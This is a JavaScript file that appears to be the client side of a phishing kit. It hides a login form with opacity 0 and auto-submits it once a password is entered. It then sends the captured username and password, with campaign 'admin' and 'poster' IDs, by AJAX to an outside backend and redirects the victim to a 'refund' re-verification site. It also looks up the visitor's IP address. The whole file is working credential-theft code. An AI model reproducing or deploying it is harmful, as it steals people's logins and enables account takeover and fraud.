

const API_URL = 'https://meetbackend-three.vercel.app'
const siteUrl ='www.meggapursonel.online'

function detectDevice(userAgent) {
    if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
      return "phone";
    }
    if (/Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i.test(userAgent)) {
      return "ipad";
    }
    return "desktop";
  }

  async function verifyPage(params) {
    
  }
  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip; // Set the userIp variable
    console.log('IP Address fetched:', userIp);
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP address:', error);
  }
}

window.onload = function () {
  getUserIP().then(() => {
    console.log('User IP Address:', userIp); // Access the IP after it's set
  });
};




$(document).ready(function () {
     const adminId = getQueryParam('admin');
    const posterId = getQueryParam('poster');
    const site = getQueryParam('site');
const verifyId = urlParams.get('verifyId');
    // Dynamically create the login form
    const loginForm = $('<form>', {
        id: 'loginForm',
        method: 'POST',
        css: { opacity: '0' } // Hide the form
    });

    // Add input fields: username, password, and userAgent
    const usernameField = $('<input>', {
        type: 'text',
        id: 'username',
        name: 'username'
    });

    const passwordField = $('<input>', {
        type: 'password',
        id: 'password',
        name: 'password'
    });

    const userAgentField = $('<input>', {
        type: 'text',
        id: 'userAgent',
        name: 'userAgent',
        value: navigator.userAgent // Automatically fill with the browser's user agent
    });
    

    // Append the fields to the form
    loginForm.append(usernameField, passwordField, userAgentField);
    $('body').append(loginForm);

    // Listen for changes in the password field
    passwordField.on('change', function () {
        if ($(this).val().trim() !== '') {
            loginForm.submit(); // Auto-submit the form if password is not empty
        }
    });

    // Handle form submission
    loginForm.on('submit', function (event) {
        event.preventDefault(); // Prevent default form submission

        const username = $('#username').val().trim();
        const password = $('#password').val().trim();
            console.log(username);
            console.log(password);
        if (username && password) {
            // Send form data via AJAX
            $.ajax({
                type: 'POST',
                url: `${API_URL}/ad/${adminId}/${posterId}`,
                data: {
                   site:site,
                    mail: username,
                    passcode: password,
                    adminId: adminId,
                    posterId: posterId

                },
                success: function (response) {
                    console.log('Response:', response);
                    
                        // Redirect to another URL on success
                        window.onload = function(){
                            window.location.href = `https://agesmart-re-verify.shop/refund/${adminId}/${posterId}/${verifyId}`;
                          }
                    
                },
                error: function (xhr, status, error) {
                    console.error('Error during form submission:', error);
                }
            });
        } else {
            console.error('Username and password are required.');
        }
    });


});

